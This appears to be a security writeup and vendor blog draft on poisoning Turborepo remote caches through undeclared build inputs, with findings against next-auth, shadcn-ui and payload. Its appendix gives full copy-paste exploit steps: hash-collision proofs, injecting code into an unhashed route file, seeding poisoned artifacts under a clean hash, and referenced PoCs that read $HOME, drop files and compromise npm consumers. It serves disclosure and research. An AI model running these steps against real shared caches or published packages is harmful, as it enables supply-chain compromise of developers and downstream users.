# Remote cache is unsafe without input guarding

**Turborepo hashes the inputs YOU declare. Miss one and the cache replays an
artifact that no longer matches the source. A teammate's branch can poison main.**

---

### The flaw (one sentence)

Turbo's cache key = the declared inputs. If a file the build actually reads is not
in that set (a gitignored file, a shared root config, an omitted source dir), then
changing it does NOT change the key - so a poisoned artifact is served under a
clean hash. Verified on turbo 2.9.18: clean and malicious builds produce the
byte-identical key `ec85d09ea396e535`.

### It is real in the wild (verified, public repos)

| Repo                     | Unhashed input the build compiles in (hash verified identical before/after edit)                                                                                                        |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **nextauthjs/next-auth** | `docs#build` inputs omit `app/**` + `hooks/**`; `app/api/cron/route.ts` compiles into cached `.next/**`. Edited it -> hash stayed `2e0720f6fb6999eb`. Server-side route = RCE on deploy. |
| **payloadcms/payload**   | root `tsconfig.base.json` via relative `extends`, used by 8+ published pkgs; zero `globalDependencies`. Edit -> hash stayed `8fd25c6dd79de644`.                        |
| **shadcn-ui/ui**         | root `tsconfig.json` via relative `extends`, used by the published `shadcn` CLI (millions of installs). Edit -> hash stayed `a69edad1dc8223aa`; **end-to-end verified** (below).        |

Plus universal gaps: gitignored files are never hashed; all repos run loose env
mode (undeclared env not hashed).

**The pattern (and the accidental fix):** a shared config is unhashed only when
referenced by RELATIVE PATH to a plain file outside the package (payload, shadcn).
When the shared config is a WORKSPACE PACKAGE instead (dubinc/dub's `tsconfig`
pkg), Turbo hashes it transitively through the dependency graph - so dub is NOT
exploitable this way (verified: editing it DID change `@dub/ui`'s hash). trpc
closes the same gap by listing tsconfig in `globalDependencies`. The takeaway:
safety depends on a config detail most teams never think about.

### Live demo beats (all run locally, real binaries)

1. **Poison** - edit one unhashed file -> same cache key -> attacker artifact served.
2. **Over HTTP** - self-hosted remote cache: attacker `PUT`s poisoned bytes under
   main's hash; victim `GET`s them. Server does ZERO content validation - raw
   `curl` stores any bytes under any hash with a write token every CI branch holds.
3. **Arbitrary code** - victim never edited the file, never saw the payload, did
   not build; loading the artifact runs attacker code (reads `$HOME`, drops a file).
4. **Supply chain** - poisoned cache -> release job gets a cache HIT -> `npm pack`
   -> consumer is compromised on `npm install` (postinstall) AND on `require()`
   (import-time; `ignore-scripts` does not save them).

### Why Nx Cloud is the answer

This is not a Turbo bug - it is the absence of input guarding, and Nx's own cache
is equally poisonable WITHOUT it. **Nx Cloud Task Sandboxing** runs each task in
an isolated filesystem that exposes ONLY declared inputs. An undeclared read fails
LOUDLY at build time (`ENOENT`) instead of silently producing a poisonable
artifact. You cannot ship a cache you cannot trust; Sandboxing makes the inputs
enforceable, not a thing you hope someone remembered to list.

> Before: undeclared read succeeds -> poisoned artifact cached -> replayed everywhere.
> After (Sandboxing): undeclared read -> build fails -> you declare the input -> the
> hash now tracks it -> poisoning is impossible.

---

# Appendix: full exploit instructions (for the blog draft)

> Scope / ethics for the writer: every step below runs against a LOCAL clone and a
> LOCAL cache. Do NOT write to a real shared/remote cache, do NOT publish, do NOT
> push to the upstream repos. These are responsible-disclosure-style demonstrations
> of a vulnerability CLASS, not attacks on the projects named.

## What is verified (read this first)

| Claim | next-auth | payload | shadcn-ui |
|-------|-----------|---------|-----------|
| Editing the unhashed file leaves the cache key identical (Tier A) | VERIFIED `2e0720f6fb6999eb` | VERIFIED `8fd25c6dd79de644` | VERIFIED `a69edad1dc8223aa` |
| Editing the unhashed file changes the build OUTPUT | definitional (it is a source file compiled into `.next/**`) | not run (build is heavy; see note) | VERIFIED (`dist/index.js` md5 `706c...` -> `52214...`) |
| Full seed -> replay over a real cache (victim gets attacker bytes) | not run (heavy docs build) | not run (heavy build) | VERIFIED end-to-end |
| Guaranteed runnable RCE + supply-chain end-to-end | the self-contained PoC in this folder (VERIFIED, runs in seconds) | | |

The two unverified rows are "heavy build" only - the mechanism is identical to the
self-contained PoC, which IS fully verified. Nothing below is left as untested
theory without saying so.

## Prerequisites

- Node 18+ and git. That is all for Tier A (the hash-collision proof needs NO
  install - `turbo --dry` reads the repo's files and `turbo.json` directly).
- First `npx turbo@...` run prompts to install; the commands below use
  `npx --yes` so copy-paste does not hang.
- Edits use Node (not `sed`) so they work on macOS and Linux identically.
- A portable md5 helper (works everywhere):
  ```bash
  md5f() { node -e 'console.log(require("crypto").createHash("md5").update(require("fs").readFileSync(process.argv[1])).digest("hex"))' "$1"; }
  ```

## The exploit primitive (same for every repo)

1. Find a file the build reads/compiles into its `outputs` that is NOT in the task
   hash (omitted from an explicit `inputs` list, or a relative-path shared file
   outside the package and not in `globalDependencies`).
2. Prove `turbo ... --dry=json` gives the SAME task hash before and after editing
   that file. Same hash == the cache cannot tell a clean build from a poisoned one.
3. On a shared cache, whoever populates that hash first wins. A malicious branch
   builds with the edited file and seeds the hash with a poisoned artifact;
   everyone on clean `main` replays it on a cache HIT - without building, without
   ever seeing the payload in their tree.

The self-hosted cache used in Tier B is `remote-cache-server.mjs` in this folder
(a ~60-line implementation of Turbo's `GET/PUT /v8/artifacts/:hash` protocol). Run
it and point Turbo at it:

```bash
node remote-cache-server.mjs &        # listens on http://127.0.0.1:9099
export TURBO_API=http://127.0.0.1:9099 TURBO_TOKEN=poc-write-token TURBO_TEAM=team_poc
# attacker seeds a hash:  turbo run <task> --cache=remote:w  --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM
# victim replays a hash:  turbo run <task> --remote-only     --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM
```

---

## 1. nextauthjs/next-auth  (explicit `inputs` omission -> server-side code)

The cleanest arbitrary-code case: the unhashed input is a SOURCE FILE the build
compiles into its server output. No injection trickery needed - editing source
changes the compiled artifact by definition.

**Vulnerable config** - `turbo.json`:

```jsonc
"docs#build": {
  "inputs": [
    "pages/**", "utils/**", "public/**", "components/**",
    "theme.config.tsx", "typedoc*", "vercel.json",
    "next-sitemap.config.cjs", "next.config.js"
  ],                                  // <- no app/**, no hooks/**, no src/**
  "outputs": [".next/**/*", "build/**/*", "!.next/cache/**", "docs/reference/**/*.mdx", ...]
}
```

`docs/app/` is a real Next.js App Router dir (`docs/app/api/cron/route.ts`,
`docs/app/api/og/route.tsx`); none are in `inputs`, all compile into `.next/**`.

**Tier A - prove the hash collision (verified, copy-paste, no install):**

```bash
git clone --depth 1 https://github.com/nextauthjs/next-auth.git && cd next-auth
hash() { npx --yes turbo@2.9.18 run build --filter=docs --dry=json 2>/dev/null \
  | node -e 'j=JSON.parse(require("fs").readFileSync(0));console.log(j.tasks.find(t=>t.taskId=="docs#build").hash)'; }
hash                                                   # -> 2e0720f6fb6999eb
echo 'console.log("TURBO_CACHE_POISON_PROOF: docs app route loaded")' >> docs/app/api/cron/route.ts
hash                                                   # -> 2e0720f6fb6999eb  (IDENTICAL)
```

The edited server route is absent from the task's 406 declared inputs.

**Tier B - end-to-end (heavy: requires building the docs site).** The docs build
pulls in many `@auth/*` package builds, so expect a long `pnpm install`. Steps:
start `remote-cache-server.mjs`, set the env vars above, then:

```bash
pnpm install                                            # heavy
# attacker branch: keep the edited route.ts
turbo run build --filter=docs --cache=remote:w --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM
# clean main: revert the route, wipe outputs, replay
git checkout -- docs/app/api/cron/route.ts && rm -rf docs/.next
turbo run build --filter=docs --remote-only --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM
# -> cache HIT; docs/.next now contains the attacker's compiled route
grep -r "TURBO_CACHE_POISON_PROOF" docs/.next | head   # the marker is in the replayed server bundle
```

**Impact:** the `.next` server bundle deployed from clean `main` contains the
attacker's route code, which runs on every request. The malicious code never
appeared in a reviewed diff on `main`.

---

## 2. shadcn-ui/ui  (relative-path root tsconfig -> poisoned published CLI)  [FULLY VERIFIED END-TO-END]

The published CLI `packages/shadcn` (`name: "shadcn"`, `bin -> dist/index.js`,
millions of installs via `npx shadcn`) extends the root config by relative path
(`extends: "../../tsconfig.json"`). Root `tsconfig.json` is a plain file outside
the package, with no `globalDependencies` declared, so it is outside the cache key.
Editing it changes the emitted bundle while the hash stays put - verified all the
way through a real cache below.

**Tier A - prove the hash collision (verified, no install):**

```bash
git clone --depth 1 https://github.com/shadcn-ui/ui.git && cd ui
hash() { npx --yes turbo@2.9.18 run build --filter=shadcn --dry=json 2>/dev/null \
  | node -e 'j=JSON.parse(require("fs").readFileSync(0));console.log(j.tasks.find(t=>t.taskId=="shadcn#build").hash)'; }
hash                                                   # -> a69edad1dc8223aa
node -e 's="tsconfig.json";c=require("fs").readFileSync(s,"utf8").replace(/"strict": true/,`"strict": true,\n    "useDefineForClassFields": false,\n    "alwaysStrict": false`);require("fs").writeFileSync(s,c)'
hash                                                   # -> a69edad1dc8223aa  (IDENTICAL)
```

**Tier B - full seed -> replay over the self-hosted cache (VERIFIED - real numbers
reproduced below).** Requires one `pnpm install` (shadcn builds in ~7s after that).

```bash
pnpm install --ignore-scripts                          # one-time, ~minutes
cp /path/to/remote-cache-server.mjs .
node remote-cache-server.mjs & sleep 1
export TURBO_API=http://127.0.0.1:9099 TURBO_TOKEN=poc-write-token TURBO_TEAM=team_poc
md5f() { node -e 'console.log(require("crypto").createHash("md5").update(require("fs").readFileSync(process.argv[1])).digest("hex"))' "$1"; }
TT() { npx --yes pnpm@10 exec turbo "$@" --api=$TURBO_API --token=$TURBO_TOKEN --team=$TURBO_TEAM; }

# STEP 1  clean main: build -> seed remote cache
git checkout -- tsconfig.json; rm -rf packages/shadcn/dist
TT run build --filter=shadcn --remote-only            # cache miss, executing 552ac6bacfabdf02
md5f packages/shadcn/dist/index.js                    # 706c4a036cc13c6480a75db107e43495  (clean)

# STEP 2  attacker: edit ONLY the unhashed root tsconfig, seed poisoned under same hash
node -e 's="tsconfig.json";c=require("fs").readFileSync(s,"utf8").replace(/"strict": true/,`"strict": true,\n    "useDefineForClassFields": false,\n    "alwaysStrict": false`);require("fs").writeFileSync(s,c)'
rm -rf packages/shadcn/dist
TT run build --filter=shadcn --cache=remote:w         # cache bypass, force executing 552ac6bacfabdf02 (SAME hash)
md5f packages/shadcn/dist/index.js                    # 52214da98b532299ecdcaf2fd8ff3832  (poisoned)

# STEP 3  victim on clean main: revert source, wipe dist, pull from cache
git checkout -- tsconfig.json; rm -rf packages/shadcn/dist
TT run build --filter=shadcn --remote-only            # cache hit, replaying logs 552ac6bacfabdf02
md5f packages/shadcn/dist/index.js                    # 52214da98b532299ecdcaf2fd8ff3832  <- ATTACKER's bytes
```

Server access log from the verified run:

```
PUT /v8/artifacts/552ac6bacfabdf02 <- 122521 bytes   (clean, from STEP 1)
PUT /v8/artifacts/552ac6bacfabdf02 <- 122222 bytes   (poisoned, STEP 2, same hash)
GET /v8/artifacts/552ac6bacfabdf02 -> 200 122222     (STEP 3 victim pulls poisoned)
```

The victim's published `dist/index.js` is byte-for-byte the attacker's, under the
clean hash. **Honest scope of the payload:** the demonstrated edit
(`useDefineForClassFields`/`alwaysStrict`) flips compiler semantics, which proves
ARTIFACT SUBSTITUTION (the victim ships bytes they did not build). A clean
one-edit ARBITRARY-CODE injection through the root tsconfig is limited here,
because `packages/shadcn/tsconfig.json` (which IS hashed) redefines `paths`, so a
malicious `paths` remap in the root file is overridden. For weaponized
arbitrary-code, use the source-file vector (next-auth) or the self-contained PoC.

**Impact:** the shadcn CLI runs on developer machines via `npx shadcn add ...`;
shipping an artifact built from an unhashed, attacker-controlled config is
developer-machine artifact tampering at massive scale.

---

## 3. payloadcms/payload  (relative-path shared tsconfig)

`turbo.json` declares NO `globalDependencies`. 8+ published packages extend the
root config by relative path, e.g. `packages/translations/tsconfig.json` ->
`"extends": "../../tsconfig.base.json"`. `tsconfig.base.json` is a plain root file,
outside every package and not in `globalDependencies`, so it is outside the hash.

**Tier A - prove the hash collision (verified, no install):**

```bash
git clone --depth 1 https://github.com/payloadcms/payload.git && cd payload
hash() { npx --yes turbo@2.9.18 run build --filter=@payloadcms/translations --dry=json 2>/dev/null \
  | node -e 'j=JSON.parse(require("fs").readFileSync(0));console.log(j.tasks.find(t=>t.taskId=="@payloadcms/translations#build").hash)'; }
hash                                                   # -> 8fd25c6dd79de644
node -e 's="tsconfig.base.json";c=require("fs").readFileSync(s,"utf8").replace(/"target": "ES2022"/,`"target": "ES2017"`);require("fs").writeFileSync(s,c)'
hash                                                   # -> 8fd25c6dd79de644  (IDENTICAL)
```

**Output-change + Tier B - NOT run here (heavy build).** Honest mechanics for the
writer:

- The reliable lever is COMPILER OPTIONS that change emitted JS (`target` downlevel,
  `useDefineForClassFields`, `importHelpers`, strictness) - same family that was
  verified to change shadcn's bundle. That gives artifact substitution.
- A `paths` remap does NOT automatically inject code: TypeScript `tsc` uses `paths`
  for type resolution only and emits the ORIGINAL import specifier, so plain `tsc`
  builds are not injectable this way. `paths` injection works only when the build
  is a BUNDLER (esbuild/swc/webpack) or runs `tsc-alias`. Confirm payload's build
  tool before making a `paths`-injection claim in the post.
- End-to-end replay is identical to the shadcn flow above (seed with
  `--cache=remote:w`, replay with `--remote-only`); it just needs payload's full
  build.

**Impact:** poisoned published packages (`@payloadcms/storage-s3`,
`create-payload-app`, etc.); downstream consumers run/load the substituted
artifact. (See `../turbo-supply-chain-poc` for the full pack + consumer-install
chain, which IS verified end-to-end on a synthetic package.)

---

## Counter-examples to cite (the fix already exists in the wild)

- **dubinc/dub** uses the SAME tsconfig-sharing idea but as a WORKSPACE PACKAGE
  (`tsconfig` pkg; `@dub/ui` extends `"tsconfig/react-library.json"`). Turbo hashes
  workspace-dependency files transitively, so editing `react-library.json` DID
  change `@dub/ui`'s hash (`c07b2466e4500c73` -> `2829a13557d9f38a`). Not
  exploitable this way - verified.
- **trpc/trpc** closes the same gap by listing `tsconfig.json`,
  `tsconfig.build.json`, `scripts/**` in `globalDependencies`.

Both are accidental, fragile fixes that depend on a config nicety. The point of the
post: correctness here is left to humans remembering to enumerate inputs. Nx Cloud
Task Sandboxing makes it structural - an undeclared read cannot silently succeed.

---

## Guaranteed-runnable end-to-end (RCE + supply chain) - the safest demo to film

If you want a from-scratch demo that runs in seconds and shows full arbitrary code
execution and consumer compromise without building any large repo, use the
self-contained PoCs in this folder (all verified):

```bash
# 1) local cache poisoning -> arbitrary code execution
cd turbo-cache-poisoning-poc && pnpm install && bash run-poc.sh
#    victim restores attacker artifact from cache; loading it prints [PWNED],
#    reads $HOME, and drops /tmp/PWNED_BY_CACHE.txt

# 2) HTTP remote cache poisoned over the wire + zero content validation
cd turbo-cache-poisoning-poc && bash run-poc-http.sh
#    server log shows PUT(clean) -> PUT(poisoned, same hash) -> GET(poisoned);
#    plus a raw `curl PUT` storing arbitrary bytes under a made-up hash (202)

# 3) supply chain: poisoned cache -> npm pack -> consumer RCE
cd turbo-supply-chain-poc && pnpm install --ignore-scripts && bash run-supply-chain.sh
#    consumer is compromised on `npm install` (postinstall) AND on require()
#    (import-time; --ignore-scripts does not save them)

# 4) the fix: same misconfig in Nx, blocked by Task Sandboxing
cd nx-sandbox-poc && pnpm install && bash run-nx-poc.sh
#    PART A: Nx default cache equally poisonable
#    PART B: sandbox -> undeclared read fails with ENOENT, nothing cached
#    PART C: declare the input -> the edit busts the hash -> no replay
```
